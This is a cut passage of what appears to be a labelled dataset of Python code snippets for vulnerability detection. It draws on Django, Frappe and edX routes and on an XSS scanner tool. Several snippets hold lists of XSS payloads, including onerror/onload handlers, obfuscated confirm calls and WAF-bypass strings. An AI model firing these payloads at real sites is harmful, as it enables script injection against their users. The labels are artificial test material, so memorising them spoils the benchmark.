blue').grid(row=7) Label(main", "label": 0}, {"snippet_id": 51904, "code": " CELERY_TASK_SERIALIZER='pickle' CELERY_RESULT_SERIALIZER='pickle' CELERY_TIMEZONE='UTC' CELERY_BEAT_SCHEDULER='django_celery_beat.schedulers:DatabaseScheduler' CELERY_BROKER_CONNECTION_MAX_RETRIES=1 CELERY_BROKER_CONNECTION_RETRY", "label": 0}, {"snippet_id": 21961, "code": ".provider_xrds', name='openid-provider-xrds') ) if settings.MITX_FEATURES.get('ENABLE_PEARSON_LOGIN', False): urlpatterns +=url(r'^testcenter/login$', 'external_auth.views.test_center_login'), if settings", "label": 0}, {"snippet_id": 28580, "code": ") \t\tpass \t def telegram_send_mess(mess, **kwargs): \timport telebot \tfrom telebot import apihelper \timport sql \t \ttelegrams=sql.get_telegram_by_ip(kwargs.get('ip')) \tproxy=sql.get_setting('proxy') \t \tfor", "label": 0}, {"snippet_id": 17028, "code": ">[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems$', 'open_ended_grading.views.flagged_problem_list', name='open_ended_flagged_problems'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems", "label": 0}, {"snippet_id": 28418, "code": "\tfrom pytz import timezone \timport sql \tnow_utc=datetime.now(timezone(sql.get_setting('time_zone'))) \tif type=='config': \t\tfmt=\"%Y-%m-%d.%H:%M:%S\" \tif type=='logs': \t\tfmt='%Y%m%d' \tif type==\"date_in_log", "label": 0}, {"snippet_id": 13103, "code": " 'student.views.pending_name_changes'), url(r'^event$', 'track.views.user_track'), url(r'^t/(?P<template>[^/]*)$', 'static_template_view.views.index'), url(r'^accounts/login$', 'student.views.accounts_login", "label": 0}, {"snippet_id": 37434, "code": "\"name\": \"Blog\", \"route\": \"/blog\"}, \t\t\t{\"label\": context.category.title, \"route\":context.category.route}] def get_list_context(context=None): \tlist_context=frappe._dict( \t\ttemplate=\"templates/includes/blog", "label": 0}, {"snippet_id": 2630, "code": "=xss_payload_decode(payload) if host_header_xss.text.find(decoded_payload) !=-1: impact=\"Low\" print \"%s[{0}]{1} is vulnerable to XSS%s\".format(impact,url)%(api_logger.G, api_logger.W) attack_result={ \"id\": 11", "label": 0}, {"snippet_id": 9335, "code": "'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/instructor$', 'instructor.views.instructor_dashboard', name=\"instructor_dashboard\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/gradebook$', 'instructor.views", "label": 0}, {"snippet_id": 42309, "code": " convert_dates_to_str=False): \t\tdoc=self.get_valid_dict(convert_dates_to_str=convert_dates_to_str) \t\tdoc[\"doctype\"]=self.doctype \t\tfor df in self.meta.get_table_fields(): \t\t\tchildren=self.get(df.fieldname) or[] \t\t\tdoc[df", "label": 0}, {"snippet_id": 38935, "code": " AttributeError(key) \t\t\tvalue=get_controller(value[\"doctype\"])(value) \t\t\tvalue.init_valid_columns() \t\tvalue.parent=self.name \t\tvalue.parenttype=self.doctype \t\tvalue.parentfield=key \t\tif value.docstatus is None: \t", "label": 0}, {"snippet_id": 22900, "code": "+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$', 'staticbook.views.html_index', name=\"html_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/?$', 'courseware", "label": 1}, {"snippet_id": 13390, "code": ")$', 'static_template_view.views.render_press_release', name='press_release'), (r'^favicon\\.ico$', 'django.views.generic.simple.redirect_to',{'url': '/static/images/favicon.ico'}), url(r'^submit_feedback$", "label": 0}, {"snippet_id": 36409, "code": " \t\t\t\t \t\t\t\tif self.get('parent_doc'): \t\t\t\t\tself.parent_doc.get_latest() \t\t\t\t\tref_doc=[d for d in self.parent_doc.get(self.parentfield) if d.name==self.name][0] \t\t\t\telse: \t\t\t\t\tref_doc=self.get_latest() \t", "label": 0}, {"snippet_id": 33288, "code": " def get_frontend_routes(): endpoints_services=[ legacy_api.BuildBucketApi, config_api.ConfigApi, swarmbucket_api.SwarmbucketApi, ] routes=[ webapp2.Route(r'/', MainHandler), webapp2.Route(r'/b/<build_id", "label": 0}, {"snippet_id": 896, "code": " impact def xss_get_url(url,method,headers,body,scanid=None): xss_result='' xss_payloads=fetch_xss_payload() uri_check_list=['?', '&', '=', '%3F', '%26', '%3D'] for uri_list in uri_check_list: if uri_list", "label": 1}, {"snippet_id": 10665, "code": " serversonly -prepare and run the necessary servers, only stopping when interrupted with Ctrl-C testsonly -assume servers are running(as per above) and run tests with no setup or cleaning of environment", "label": 0}, {"snippet_id": 30989, "code": "'master'): \tmaster=form.getvalue('master') \tslave=form.getvalue('slave') \tinterface=form.getvalue('interface') \tvrrpip=form.getvalue('vrrpip') \ttmp_config_path=sql.get_setting('tmp_config_path') \tscript", "label": 0}, {"snippet_id": 5535, "code": "(window.name)>', '<svg/onload=eval(location.hash.slice(1))>', '<img src=x onerror=alert(/xss/)>', \"\"\"<img src=\"javascript:alert('xss');\">\"\"\", \"\"\"<style>@im\\\\port'\\\\ja\\\\vasc\\\\ript:alert(\"xss\")';</style>\"\"\"", "label": 0}, {"snippet_id": 32551, "code": ": path=path[len('/chromium/src/+/master'):] full_path=os.path.realpath(os.path.join(self.server.top_level, path[1:])) if not full_path.startswith(self.server.top_level): self._DoUnknown() elif path in(", "label": 0}, {"snippet_id": 53442, "code": "['uuid'], type='oozie-bundle2', owner=request.user) Document.objects.link(bundle_doc, owner=bundle_doc.owner, name=bundle_doc.name, description=bundle_doc.description, extra='bundle2') if bundle_data['coordinators", "label": 0}, {"snippet_id": 1083, "code": "{1} is vulnerable to XSS%s\".format(impact,url)%(api_logger.G, api_logger.W) if db_update is not True: attack_result={ \"id\": 11, \"scanid\": scanid, \"url\": xss_url, \"alert\": \"Cross Site Scripting\", \"impact", "label": 0}, {"snippet_id": 54140, "code": " stop=False def scan(): sc().start() class ki(threading.Thread): def run(self): global stop stop=True def kill(): ki().start() main=Tk() main.title(\"XSS Sonar\") main.configure(background='light sky blue'", "label": 0}, {"snippet_id": 19079, "code": "(*urlpatterns) if settings.DEBUG: urlpatterns +=static(settings.STATIC_URL, document_root=settings.STATIC_ROOT) handler404='static_template_view.views.render_404' handler500='static_template_view.views", "label": 0}, {"snippet_id": 40880, "code": " not isinstance(fval,(tuple, list)): \t\t\t\tif fval is True: \t\t\t\t\tfval=(\"not None\", fval) \t\t\t\telif fval is False: \t\t\t\t\tfval=(\"None\", fval) \t\t\t\telif isinstance(fval, string_types) and fval.startswith(\"^\"): \t\t", "label": 0}, {"snippet_id": 22866, "code": "/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/(?P<page>[^/]*)$', 'staticbook.views.pdf_index', name=\"pdf_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>", "label": 1}, {"snippet_id": 16929, "code": ".instructor_dashboard', name=\"instructor_dashboard\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/gradebook$', 'instructor.views.gradebook', name='gradebook'), url(r'^courses/(?P<course_id>[^/]+/[^/]+", "label": 0}, {"snippet_id": 8237, "code": "/$', 'external_auth.views.course_specific_register', name='course-specific-register'), ) if settings.MITX_FEATURES.get('AUTH_USE_OPENID_PROVIDER'): urlpatterns +=( url(r'^openid/provider/login/$', 'external_auth", "label": 0}, {"snippet_id": 39507, "code": "(self): \t\t'''Update modified timestamp''' \t\tself.set(\"modified\", now()) \t\tfrappe.db.set_value(self.doctype, self.name, 'modified', self.modified, update_modified=False) \tdef _fix_numeric_types(self): \t\tfor", "label": 0}, {"snippet_id": 4268, "code": " vulnerable to XSS\"}}) def xss_check(url,method,headers,body,scanid): if method=='GET' or method=='DEL': xss_get_uri(url,method,headers,body,scanid) xss_get_url(url,method,headers,body,scanid) if method=", "label": 0}, {"snippet_id": 6552, "code": "'raven_dsn') @property def content_packages(self): \"\"\" Get list of tuples with packages and paths to content resources, such as login.html. The expected format in the INI file is content_packages=pkg1:some", "label": 0}, {"snippet_id": 5251, "code": "'b', 'base', 'basefont', 'bdi', 'bdo', 'bgsound', 'big', 'blink', 'blockquote', 'body', 'br', 'button', 'canvas', 'caption', 'center', 'cite', 'code', 'col', 'colgroup', 'command', 'content', 'data', 'datalist", "label": 0}, {"snippet_id": 12465, "code": "'open_ended_problems'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems$', 'open_ended_grading.views.flagged_problem_list', name='open_ended_flagged_problems'), url(r'^courses", "label": 0}, {"snippet_id": 4887, "code": "-7\"> </head>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-\"\"\", ] _waf_payloads=[ \"<IMG SRC=JaVaScRiPt:alert('xss')>\", '<<script>alert(\"xss\");//<</script>', \"\"\"<img src=\"javascript:alert('xss')\" \"\"\", '<a", "label": 1}, {"snippet_id": 54148, "code": ": global stop stop=True def kill(): ki().start() main=Tk() main.title(\"XSS Sonar\") main.configure(background='light sky blue') Label(main, text=\"Target:\",background='light sky blue').grid(row=0) Label(main", "label": 0}, {"snippet_id": 48469, "code": " reservation \"\"\" u: Profile=get_current_user(request) forward_url=\"/admin?success\" if u.rights > 0: forward_url=\"/admin/reservations\" if request.GET.get(\"redirect\"): forward_url=request.GET[\"redirect\"] if ", "label": 0}, {"snippet_id": 37028, "code": ".db.escape(filters.blogger)) \t\tif filters.blog_category: \t\t\tconditions.append('t1.blog_category=\"%s\"' % frappe.db.escape(filters.blog_category)) \tif txt: \t\tconditions.append('(t1.content like \"%{0}%\" or", "label": 0}, {"snippet_id": 24960, "code": "'should_fetch_course') self.imports_dir=path('test_root/courses/') self.pa11y_report_dir=os.path.join(self.report_dir, 'pa11ycrawler_reports') self.tar_gz_file=\"https://github.com/edx/demo-test-course/archive", "label": 0}, {"snippet_id": 7592, "code": "*)/$', 'staticbook.views.index', name=\"book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/(?P<page>[^/]*)$', 'staticbook.views.index'), url(r'^courses/(?P<course_id>[^/]", "label": 1}, {"snippet_id": 45045, "code": "(popup), mimetype=\"application/json\") def _submit_workflow(user, fs, jt, workflow, mapping): try: submission=Submission(user, workflow, fs, jt, mapping) job_id=submission.run() return job_id except RestException", "label": 0}, {"snippet_id": 50258, "code": " Args: request(Request): Incoming request. \"\"\" csessid=request.args.get('csessid')[0] remote_addr=request.getClientIP() host_string=\"%s(%s:%s)\" %(_SERVERNAME, request.getRequestHostname(), request.getHost", "label": 1}, {"snippet_id": 37287, "code": " self.published and not self.published_on: \t\t\tself.published_on=today() \t\t \t\tfrappe.db.sql(\"\"\"update tabBlogger set posts=(select count(*) from `tabBlog Post` \t\t\twhere ifnull(blogger,'')=tabBlogger.name)", "label": 0}, {"snippet_id": 19330, "code": "(self): suite=BokChoyTestSuite('', serversonly=True) self.assertEqual(suite.cmd, \"\") def test_verify_xss(self): suite=BokChoyTestSuite('', verify_xss=True) name='tests' self.assertEqual(suite.cmd, self", "label": 1}, {"snippet_id": 27401, "code": " return obj.to_dict() elif isinstance(obj, cgi.FieldStorage): return str(obj) else: raise Exception('Cannot serialise %s' % obj) def format_time(dt): \"\"\"Format datetime object for display.\"\"\" return '{t", "label": 0}, {"snippet_id": 43753, "code": "(fieldname) \t\tif meta_df and meta_df.get(\"__print_hide\"): \t\t\treturn True \t\tprint_hide=0 \t\tif self.get(fieldname)==0 and not self.meta.istable: \t\t\tprint_hide=( df and df.print_hide_if_no_value) or( meta_df", "label": 0}, {"snippet_id": 42027, "code": " isinstance(value, BaseDocument): \t\t\tif \"doctype\" not in value: \t\t\t\tvalue[\"doctype\"]=self.get_table_field_doctype(key) \t\t\t\tif not value[\"doctype\"]: \t\t\t\t\traise AttributeError(key) \t\t\tvalue=get_controller", "label": 0}, {"snippet_id": 19002, "code": "'track.views.view_tracking_log'), ) if settings.MITX_FEATURES.get('ENABLE_SERVICE_STATUS'): urlpatterns +=( url(r'^status/', include('service_status.urls')), ) if settings.MITX_FEATURES.get('ENABLE_INSTRUCTOR_BACKGROUND_TASKS", "label": 0}, {"snippet_id": 50213, "code": "(data)) self.databuffer[csessid]=dataentries def client_disconnect(self, csessid): \"\"\" Disconnect session with given csessid. Args: csessid(int): Session id. \"\"\" if csessid in self.requests: self.requests", "label": 0}, {"snippet_id": 37546, "code": ".parents=[{\"name\": _(\"Home\"), \"route\": \"/\"}] \tlist_context.update(frappe.get_doc(\"Blog Settings\", \"Blog Settings\").as_dict(no_default_fields=True)) \treturn list_context def get_children(): \treturn frappe", "label": 0}, {"snippet_id": 36213, "code": " fieldname in default_fields: \t\t\tfrom frappe.model.meta import get_default_df \t\t\tdf=get_default_df(fieldname) \t\tval=self.get(fieldname) \t\tif translated: \t\t\tval=_(val) \t\tif absolute_value and isinstance(val", "label": 0}, {"snippet_id": 43491, "code": "\tif new_password and not self.is_dummy_password(new_password): \t\t\t\t \t\t\t\tset_encrypted_password(self.doctype, self.name, new_password, df.fieldname) \t\t\t\t \t\t\t\tself.set(df.fieldname, '*'*len(new_password)", "label": 0}, {"snippet_id": 41409, "code": "\"\\ \t\tselect \t\t\tt1.title, t1.name, t1.blog_category, t1.route, t1.published_on, \t\t\t\tt1.published_on as creation, \t\t\t\tt1.content as content, \t\t\t\tifnull(t1.blog_intro, t1.content) as intro, \t\t\t\tt2.full_name", "label": 0}, {"snippet_id": 23415, "code": "'^course_specific_login/(?P<course_id>[^/]+/[^/]+/[^/]+)/$', 'external_auth.views.course_specific_login', name='course-specific-login'), url(r'^course_specific_register/(?P<course_id>[^/]+/[^/]+/[^/]+)", "label": 0}, {"snippet_id": 42081, "code": ", None): \t\t\tvalue.__dict__['__islocal']=1 \t\treturn value \tdef get_valid_dict(self, sanitize=True, convert_dates_to_str=False): \t\td=frappe._dict() \t\tfor fieldname in self.meta.get_valid_columns(): \t\t\td[fieldname", "label": 0}, {"snippet_id": 51385, "code": " Generated by 'django-admin startproject' using Django 2.1.7. For more information on this file, see https://docs.djangoproject.com/en/2.1/topics/settings/ For the full list of settings and their values", "label": 0}, {"snippet_id": 28573, "code": "</div></center>' % e) \t\tpass \t def telegram_send_mess(mess, **kwargs): \timport telebot \tfrom telebot import apihelper \timport sql \t \ttelegrams=sql.get_telegram_by_ip(kwargs.get('ip')) \tproxy=sql.get_setting", "label": 0}, {"snippet_id": 22913, "code": ", name=\"html_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/?$', 'courseware.views.index', name=\"courseware\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter", "label": 0}, {"snippet_id": 4645, "code": " 'rt', 'rtc', 'ruby', 's', 'samp', 'script', 'section', 'select', 'shadow', 'small', 'source', 'spacer', 'span', 'strike', 'strong', 'style', 'sub', 'summary', 'sup', 'table', 'tbody', 'td', 'template'", "label": 0}, {"snippet_id": 12961, "code": "(r'^comm/foldit_ops', 'foldit.views.foldit_ops', name=\"foldit_ops\"), ) if settings.MITX_FEATURES.get('ENABLE_DEBUG_RUN_PYTHON'): urlpatterns +=( url(r'^debug/run_python', 'debug.views.run_python'), ) if", "label": 0}, {"snippet_id": 24763, "code": " \"./manage.py cms --settings=bok_choy import{import_dir}\".format( default_store=self.default_store, import_dir=self.imports_dir ) ) def load_data(self): \"\"\" Loads data into database from db_fixtures \"\"", "label": 0}, {"snippet_id": 20855, "code": ", kwargs={'org_id': 'TorontoX'}), url(r'^(?i)university_profile/RiceX$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'RiceX'}), url(r'^(?i)university_profile", "label": 0}, {"snippet_id": 25153, "code": " django import forms from django.contrib import messages from django.core.exceptions import ValidationError from django.utils.safestring import mark_safe from django.utils.translation import ugettext_lazy", "label": 0}, {"snippet_id": 52498, "code": ".username, 'value': workflow.uuid, 'id': workflow.id } for workflow in[d.content_object for d in Document.objects.get_docs(user, Document2, extra='workflow2')] ] def add_node(request): response={'status': ", "label": 0}, {"snippet_id": 6025, "code": " eduID IdP. \"\"\" import os import ConfigParser _CONFIG_DEFAULTS={'debug': False, 'syslog_debug': '0', 'num_threads': '8', 'logdir': None, 'logfile': None, 'syslog_socket': None, 'listen_addr': '0.0.0.0'", "label": 0}, {"snippet_id": 17686, "code": ".views.login_user', name=\"login\"), url(r'^login_ajax/(?P<error>[^/]*)$', 'student.views.login_user'), url(r'^logout$', 'student.views.logout_user', name='logout'), url(r'^create_account$', 'student.views", "label": 0}, {"snippet_id": 22317, "code": "]+)-(?P<token>.+)/$', 'student.views.password_reset_confirm_wrapper', name='auth_password_reset_confirm'), url(r'^password_reset_complete/$', django.contrib.auth.views.password_reset_complete, name='auth_password_reset_complete", "label": 0}, {"snippet_id": 28432, "code": "\tfmt='%Y%m%d' \tif type==\"date_in_log\": \t\tfmt=\"%b %d %H:%M:%S\" \t\t \treturn now_utc.strftime(fmt) \t\t\t def logging(serv, action, **kwargs): \timport sql \timport http.cookies \tlog_path=get_config_var('main',", "label": 0}, {"snippet_id": 6672, "code": " res=[x.strip() for x in value.split(',')] self._parsed_status_test_usernames=res return res @property def signup_link(self): \"\"\" URL(string) for use in simple templating of login.html. \"\"\" return self", "label": 0}, {"snippet_id": 5705, "code": "\\'\"><y///oNMousEDown=((confirm))()>Click', '<a/href=javascript&colon;co\\u006efirm& '<img src=x onerror=confir\\u006d`1`>', '<svg/onload=co\\u006efir\\u006d`1`>', '<?xml version=\"1.0\"?><html><script xmlns=", "label": 0}, {"snippet_id": 12883, "code": "'^migrate/reload/(?P<reload_dir>[^/]+)/(?P<commit_id>[^/]+)$', 'lms_migration.migrate.manage_modulestores'), url(r'^gitreload$', 'lms_migration.migrate.gitreload'), url(r'^gitreload/(?P<reload_dir>[^/]", "label": 0}, {"snippet_id": 50888, "code": "*args(any): Remaining args will be arguments for `cmd`. Kwargs: options(dict): These are ignored for oob commands. Use command arguments(which can hold dicts) to send instructions to the client instead", "label": 0}, {"snippet_id": 37629, "code": " get_blog_list(doctype, txt=None, filters=None, limit_start=0, limit_page_length=20, order_by=None): \tconditions=[] \tif filters: \t\tif filters.blogger: \t\t\tconditions.append('t1.blogger=\"%s\"' % frappe.db.escape", "label": 0}, {"snippet_id": 10697, "code": " when running tests(split or draft) num_processes -number of processes or threads to use in tests. Recommendation is that this is less than or equal to the number of available processors. verify_xss -when", "label": 0}, {"snippet_id": 8965, "code": "(?P<course_id>[^/]+/[^/]+/[^/]+)/jump_to/(?P<location>.*)$', 'courseware.views.jump_to', name=\"jump_to\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/modx/(?P<location>.*?)/(?P<dispatch>[^/]*)$', 'courseware", "label": 0}, {"snippet_id": 40673, "code": "\tprint_hide=df.print_hide \t\t\telif meta_df: \t\t\t\tprint_hide=meta_df.print_hide \t\treturn print_hide \tdef in_format_data(self, fieldname): \t\t\"\"\"Returns True if shown via Print Format::`format_data` property.", "label": 0}, {"snippet_id": 11382, "code": "() zipped_course=self.imports_dir +'demo_course.tar.gz' msg=colorize('green', \"Fetching the test course from github...\") print msg sh( 'wget{tar_gz_file} -O{zipped_course}'.format( tar_gz_file=self.tar_gz_file", "label": 0}, {"snippet_id": 18962, "code": "?P<reload_dir>[^/]+)$', 'lms_migration.migrate.manage_modulestores'), url(r'^migrate/reload/(?P<reload_dir>[^/]+)/(?P<commit_id>[^/]+)$', 'lms_migration.migrate.manage_modulestores'), url(r'^gitreload$", "label": 0}, {"snippet_id": 46248, "code": "'can_edit_index': can_edit_index(request.user) }) def browse(request, name, is_mobile=False): engine=request.GET.get('engine', 'solr') collections=get_engine(request.user, engine).datasets() if not collections", "label": 0}, {"snippet_id": 1834, "code": " if res_headers['Content-Type']: if res_headers['Content-Type'].find('application/json') !=-1 or res_headers['Content-Type'].find('text/plain') !=-1: impact=\"Low\" else: impact=\"High\" else: impact=\"Low\"", "label": 0}, {"snippet_id": 33230, "code": ".get_result() if not can_view: if auth.get_current_identity().is_anonymous: return self.redirect(gae_users.create_login_url(self.request.url)) self.response.write('build %d not found' % build_id) self.abort(404)", "label": 1}, {"snippet_id": 39690, "code": "'' \t\tdef get_msg(df, docname): \t\t\tif self.parentfield: \t\t\t\treturn \"{} \t\t\telse: \t\t\t\treturn \"{}:{}\".format(_(df.label), docname) \t\tinvalid_links=[] \t\tcancelled_links=[] \t\tfor df in(self.meta.get_link_fields", "label": 0}, {"snippet_id": 42293, "code": " \tdef is_new(self): \t\treturn self.get(\"__islocal\") \tdef as_dict(self, no_nulls=False, no_default_fields=False, convert_dates_to_str=False): \t\tdoc=self.get_valid_dict(convert_dates_to_str=convert_dates_to_str", "label": 0}, {"snippet_id": 28587, "code": " telebot import apihelper \timport sql \t \ttelegrams=sql.get_telegram_by_ip(kwargs.get('ip')) \tproxy=sql.get_setting('proxy') \t \tfor telegram in telegrams: \t\ttoken_bot=telegram[1] \t\tchannel_name=telegram[2] ", "label": 0}, {"snippet_id": 46142, "code": " request.GET.get('is_embeddable', False), 'mobile': is_mobile, }) def index_m(request): return index(request, True) def new_search(request): engine=request.GET.get('engine', 'solr') collections=get_engine", "label": 0}, {"snippet_id": 29428, "code": " in line: \t\t\tbind=line.split(\":\") \t\t\tbind[1]=bind[1].strip(' ') \t\t\tbind=bind[1].split(\"ssl\") \t\t\tbind=bind[0].strip(' \\t\\n\\r') \t\t\tfirewalld_commands.append('sudo firewall-cmd --zone=public --add-port=%s", "label": 0}, {"snippet_id": 39606, "code": ".label)) \t\t\telif self.parentfield: \t\t\t\treturn \"{}:{}{} \t\t\t\t\t_(\"Row\"), self.idx, _(\"Value missing for\"), _(df.label)) \t\t\telse: \t\t\t\treturn _(\"Error: Value missing for{0}:{1}\").format(_(df.parent), _(df.label", "label": 0}, {"snippet_id": 15980, "code": " \"\"\" cmd_str=( 'pa11ycrawler json-to-html --pa11ycrawler-reports-dir={report_dir}' ).format(report_dir=self.pa11y_report_dir) sh(cmd_str) @property def cmd(self): \"\"\" Runs pa11ycrawler as staff user against", "label": 0}, {"snippet_id": 49922, "code": " webclient can be found on http://localhost:4001/webclient.) /webclient -this url is handled through django's template system and serves the html page for the client itself along with its javascript chat", "label": 0}, {"snippet_id": 34281, "code": "._meta \tdef update(self, d): \t\tif \"doctype\" in d: \t\t\tself.set(\"doctype\", d.get(\"doctype\")) \t\t \t\tfor key in default_fields: \t\t\tif key in d: \t\t\t\tself.set(key, d.get(key)) \t\tfor key, value in iteritems(d): \t", "label": 0}, {"snippet_id": 6554, "code": ") @property def content_packages(self): \"\"\" Get list of tuples with packages and paths to content resources, such as login.html. The expected format in the INI file is content_packages=pkg1:some/path/,", "label": 0}, {"snippet_id": 18096, "code": "[^/]*)$', 'courseware.module_render.modx_dispatch', name='modx_dispatch'), url(r'^software-licenses$', 'licenses.views.user_software_license', name=\"user_software_license\"), url(r'^courses/(?P<course_id", "label": 0}, {"snippet_id": 52410, "code": "'workflow': workflow}) workflow_doc.update_data({'layout': layout}) workflow_doc.name=workflow['name'] workflow_doc.save() workflow_instance=Workflow(document=workflow_doc) response['status']=0 response[", "label": 0}, {"snippet_id": 7216, "code": ".static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'EPFLx'}), url(r'^university_profile/(?P<org_id>[^/]+)$', 'courseware.views.university_profile', name=\"university_profile\"), ) urlpatterns +", "label": 0}, {"snippet_id": 26218, "code": " data.get('is_business') and not data.get('company'): raise ValidationError(_('You need to provide a company name.')) if not data.get('is_business') and not data.get('name_parts'): raise ValidationError(_", "label": 0}, {"snippet_id": 46234, "code": "'engines': get_engines(request.user) }), 'is_owner': True, 'is_embeddable': request.GET.get('is_embeddable', False), 'can_edit_index': can_edit_index(request.user) }) def browse(request, name, is_mobile=False", "label": 0}, {"snippet_id": 51283, "code": "/config/settings.html' admin.site.unregister([Config]) admin.site.register([Config], ConfigAdmin) @admin.register(Account) class AccountAdmin(ImportExportModelAdmin, admin.ModelAdmin): list_display=('name", "label": 0}, {"snippet_id": 110, "code": ".replace(value[0], payload) xss_request=req.api_request(xss_url,\"GET\",headers) if xss_request.text.find(payload) !=-1: impact=check_xss_impact(xss_request.headers) logs.logging.info(\"%s is vulnerable to", "label": 1}, {"snippet_id": 9360, "code": "<course_id>[^/]+/[^/]+/[^/]+)/grade_summary$', 'instructor.views.grade_summary', name='grade_summary'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading$', 'open_ended_grading.views.staff_grading',", "label": 0}, {"snippet_id": 46965, "code": " return await Comment.sync_filter(post_id=self.id, orderings=['-id']) @property @cache(MC_KEY_N_COMMENTS %('{self.id}')) async def n_comments(self): return await Comment.filter(post_id=self.id).count()", "label": 0}, {"snippet_id": 17123, "code": "'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/debug$', 'course_groups.views.debug_cohort_mgmt', name=\"debug_cohort_mgmt\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_notifications$'", "label": 0}, {"snippet_id": 17140, "code": "/open_ended_notifications$', 'open_ended_grading.views.combined_notifications', name='open_ended_notifications'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/peer_grading$', 'open_ended_grading.views.peer_grading',", "label": 0}, {"snippet_id": 28840, "code": " password=ssh_user_password) \t\treturn ssh \texcept paramiko.AuthenticationException: \t\treturn 'Authentication failed, please verify your credentials' \t\tpass \texcept paramiko.SSHException as sshException", "label": 0}, {"snippet_id": 29632, "code": "\tprint(\"<div class='alert alert-warning'>\"+line+\"</div>\") \ttry:\t \t\tssh.close() \texcept: \t\tprint(\"<div class='alert alert-danger' style='margin: 0;'>\"+str(ssh)+\"<a title='Close' id='errorMess'><b>X</b></a><", "label": 0}, {"snippet_id": 30677, "code": "\tfunct.show_log(output) \tprint(stderr) \t\t if serv is not None and act==\"showMap\": \tovw.get_map(serv) \t if form.getvalue('servaction') is not None: \tserver_state_file=sql.get_setting('server_state_file') ", "label": 0}, {"snippet_id": 17016, "code": "<course_id>[^/]+/[^/]+/[^/]+)/open_ended_problems$', 'open_ended_grading.views.student_problem_list', name='open_ended_problems'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems$", "label": 0}, {"snippet_id": 54900, "code": " from pontoon.base.utils import( require_AJAX, readonly_exists, ) from pontoon.batch import forms from pontoon.batch.actions import ACTIONS_FN_MAP log=logging.getLogger(__name__) def update_stats(translated_resources", "label": 0}, {"snippet_id": 50254, "code": " when the client requests an init mode operation(at startup) Args: request(Request): Incoming request. \"\"\" csessid=request.args.get('csessid')[0] remote_addr=request.getClientIP() host_string=\"%s(%s:%s)\" ", "label": 1}, {"snippet_id": 53683, "code": ", request.fs, request.jt, properties=properties) job_id=submission.run() return job_id except RestException, ex: raise PopupException(_(\"Error submitting bundle %s\") %(bundle,), detail=ex._headers.get(", "label": 0}, {"snippet_id": 52316, "code": "') if len(jobs) > 1 else _('Workflow copied.')) return HttpResponse(json.dumps(response), mimetype=\"application/json\") @check_document_modify_permission() def save_workflow(request): response={'status'", "label": 0}, {"snippet_id": 28885, "code": " or directory\": \t\t\treturn '%s. Check ssh key' % e \t\t\tpass \t\telif e==\"Invalid argument\": \t\t\terror='Check the IP of the server' \t\t\tpass \t\telse: \t\t\terror=e\t \t\t\tpass \t\treturn str(error) def get_config(serv", "label": 0}, {"snippet_id": 25456, "code": "'widget_kwargs',{}) ) defaults.update(**kwargs) for fname, label, size in self.scheme['fields']: defaults['label']=label field=forms.CharField(**defaults) field.part_name=fname fields.append(field) super", "label": 0}, {"snippet_id": 37101, "code": "\t\t\tand reference_name=t1.name) as comments \t\tfrom `tabBlog Post` t1, `tabBlogger` t2 \t\twhere ifnull(t1.published,0)=1 \t\tand t1.blogger=t2.name \t\t%(condition)s \t\torder by published_on desc, name asc \t\tlimit", "label": 0}, {"snippet_id": 47015, "code": " item in queryset] @comment_reacted.connect async def update_comment_list_cache(_, user_id, comment_id): comment=await Comment.cache(comment_id) if comment: asyncio.gather( clear_mc(MC_KEY_COMMENT_LIST %", "label": 0}, {"snippet_id": 43415, "code": "\tsanitized_value=sanitize_email(value) \t\t\telif df and(df.get(\"ignore_xss_filter\") \t\t\t\t\t\tor(df.get(\"fieldtype\")==\"Code\" and df.get(\"options\")!=\"Email\") \t\t\t\t\t\tor df.get(\"fieldtype\") in(\"Attach\", \"Attach Image\") \t\t\t\t\t", "label": 1}, {"snippet_id": 38140, "code": "=blogger \telif frappe.local.form_dict.txt: \t\tlist_context.sub_title=_('Filtered by \"{0}\"').format(frappe.local.form_dict.txt) \tif list_context.sub_title: \t\tlist_context.parents=[{\"name\": _(\"Home\"), \"route", "label": 1}, {"snippet_id": 47936, "code": "=pw1) auth_user.save() user: Profile=Profile() user.rights=rights user.number_of_allowed_reservations=int(request.POST[\"allowed_reservations\"]) user.displayName=displayname user.authuser=auth_user user", "label": 1}, {"snippet_id": 10512, "code": "(self): suite=Pa11yCrawler('') self.assertEqual( suite.cmd, self._expected_command(suite.pa11y_report_dir, suite.start_urls) ) def test_get_test_course(self): suite=Pa11yCrawler('') suite.get_test_course()", "label": 0}, {"snippet_id": 6483, "code": " If a user has an active SSO session, they will get SAML assertions made without having to authenticate again(unless SP requires it through ForceAuthn). The total time a user can access a particular SP", "label": 0}, {"snippet_id": 34454, "code": "\telse: \t\t\tself.__dict__[key]=value \tdef delete_key(self, key): \t\tif key in self.__dict__: \t\t\tdel self.__dict__[key] \tdef append(self, key, value=None): \t\tif value==None: \t\t\tvalue={} \t\tif isinstance(value", "label": 0}, {"snippet_id": 7559, "code": 